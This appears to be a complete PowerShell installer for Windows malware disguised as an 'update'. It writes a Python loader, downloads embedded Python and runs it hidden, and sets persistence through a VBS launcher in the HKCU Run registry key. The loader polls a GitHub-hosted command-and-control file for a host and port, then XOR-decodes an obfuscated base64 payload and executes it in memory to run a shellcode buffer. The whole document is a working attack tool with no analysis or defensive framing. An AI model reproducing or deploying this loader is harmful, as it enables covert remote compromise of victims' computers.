# Папка куда сохранить Python
$InstallPath = "C:\Tools\update"

# Создать папку
New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null

$ScriptPath = Join-Path $InstallPath "update.py"

# Содержимое файла update.py (с объявлением переменной a)
$PythonCode = @"
import ctypes, base64
import threading
from ctypes import wintypes
from urllib.request import urlopen
import socket
import time
import os
import winreg

url = "https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/c2.txt"
    
def create_vbs(vbs_path):
    with open(vbs_path, "w", encoding="utf-8") as f:
        f.write('CreateObject("Wscript.Shell").Run '
            '"""C:\\Tools\\update\\python.exe"" '
            '""C:\\Tools\\update\\update.py""", 0, False')
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key,"Task",0,winreg.REG_SZ,r"C:\Tools\update\update.vbs")

def start():
    key = b"password123"
    def xor_data(data, key):
        data = bytearray(data)
        for i in range(len(data)):
            data[i] ^= key[i % len(key)]
        return bytes(data)

    #with urlopen("https://github.com/gaca9302/usb/raw/refs/heads/main/c2/bin.bin") as response:
    #    buf = response.read()
    with open(r'C:\Tools\Python312\bin.bin', 'rb') as f:
        buf = f.read()

    thread_func = 'egUWFVc7GhZUU1c2FB0QAwYdChleQyAAARIaCgYBQxsJekFTU1ciNylucXw9LDonV1JSVEkDA0BReVNXT1I0cHV2LyQrNjQ6JiFuYHYxJSQhPjs3RAwSAwhVQ3lXT1JEWldBHgQfQEVPT0RSRkoABABdAAYcAF1eHRsEAR0SA0FWOxITUEEYFgUBFwgCAB03BAcwAh0AAV9GYwIOEBYEHFwWVEFHCREWU0pPBQ1fRkoABABdPy48IH13OVBBU1McCgAKVF4AQk8lGgUbBwVdc18cDhA2D0ETFlZGSgAEAFNKTykTWFxHCREWAFknMyp1fnZcQQQaGRsLFFRBHTwxJTw+K15EUkZKAAQAXRQwAQ1LV2wETVMEHgEGHUFXQF4lJDwlK15ERltdBBgDFgRBNjN+YHcta1NTV08ZAUNcVhxSQV0hBgAQRFNfMQ0fHBQqCkpDV0AEGAMWV1JSE1hcRwkRFgBZIyIyfnt3ekFTU1cEFxZfV19DU10kBQYGAWFAXBMEAAA6Ch8LQ0sdERMUBw4fFxcRDxMrFhodAxYCAUIcezEvNz8yQ1ITWFxHCREWAFkjIjJ+e3dcQQQaGRsLFFRBHTwxMCU4JjZIEVFHCREWAFkMLRdYSFYvFV9TFBsLFFRBHSAuOj0jKiBMUkZKAAQAXRQwAQ1LV2wESC55V09SRFpXQR4EH0BFQSUWWEZWIBMcEBIcASlUX1wCGF0BEhwGHUFXE01BBBoZGwsUVEEdMi48P31PUkQRUUYCExYdAzACFl5RVgMSU05XBBcWX1dfQ1NdNBIbMRFDQFYeFSMBGAwXF0IaGnpBU1NXHBE7XFdeHxMKU0pPGQFDXFYcUkFdIQYAEERTXzENHxwUKgpMUkdBAgQdBygfAAtSV0ADTVM9GAEXSBFeVh5JEQYRRl5EfHd+LyI8PjomJkgRYnI3JCw2LyoxMWV3bCIkMjcgPTswdBs5UEFTUxUWBgFCbUQCCAcHEgFSWRFRRwkRFgBZDC0XWEhWLxVbQ15lUkQRElgVEx0WG1xASmZAWgQEIwEYDBcXQn9WHQ4BCl8MBxZDV10EPgMBGAwXF0IeEwMCLB4SAh0WSB5QBBgDFgRBETtSWlICPgNbFRoUTR1eVh5JEQYRRl4HRUtDFRJdEQ4dFwIZUEoEBAAsAB0bEEVXXVlIeVNXT1IXWVdfHD4VBhkMUlkRUUcJERYAWSw0MX9xZykxNls5ABwBGBpAEz4eFhoAAB0YOBNQQVMAHwoeCG5URh4CW1p9T1JEEUBWBBQBHVdeeA=='

    text = xor_data(base64.b64decode(thread_func), key).decode("utf-8")
    namespace = {"ctypes": ctypes,"buf": buf,"wintypes": wintypes}
    exec(compile(text, "<memory>", "exec"),namespace)
    thread = threading.Thread(target=namespace["ThreadFunction"], args=(None,))
    thread.start()

if __name__ == "__main__":
    vbs_path = r"C:\Tools\update\update.vbs"
    if not os.path.exists(vbs_path):
        create_vbs(vbs_path)
    flag = True
    while flag:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.0)
            try: 
                with urlopen(url) as response:
                    data = response.read().decode('utf-8').strip()
                    host, port = data.split(":")
                    result = s.connect_ex((host, int(port)))
                    if result == 0:
                        print("start process")
                        start()
                        flag = False
            except Exception as e:
                print(e)            
            time.sleep(60)
"@

# Создать файл start.vbs в кодировке UTF8
Set-Content -Path $ScriptPath -Value $PythonCode -Encoding UTF8

#######################################################################################

$VbsPath = Join-Path $InstallPath "start.vbs"
# Содержимое файла update.py (с объявлением переменной a)
$VbsCode = @"
Option Explicit
Dim objShell, objFSO, objHTTP, objStream
Dim strURL, strZipPath, strExtractPath, strPythonExe
strURL = "https://www.python.org/ftp/python/3.13.14/python-3.13.14-embed-amd64.zip"
strZipPath = "C:\Tools\update\python.zip"
strExtractPath = "C:\Tools\update"
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Not objFSO.FolderExists("C:\Tools\update") Then
    objFSO.CreateFolder("C:\Tools\update")
End If
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "GET", strURL, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' adTypeBinary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strZipPath, 2 ' adSaveCreateOverWrite
    objStream.Close
    objShell.Run "powershell -command ""Expand-Archive -Path '" & strZipPath & "' -DestinationPath '" & strExtractPath & "' -Force""", 0, True
    objFSO.DeleteFile strZipPath
    strPythonExe = strExtractPath & "\python.exe"
    objShell.Run """" & strPythonExe & """" & " " & """" & strExtractPath & "\update.py""", 0, False
End If
"@

# Создать файл start.vbs в кодировке UTF8
[System.IO.File]::WriteAllText($VbsPath, $VbsCode, [System.Text.Encoding]::ASCII)
& "C:\Tools\update\start.vbs"
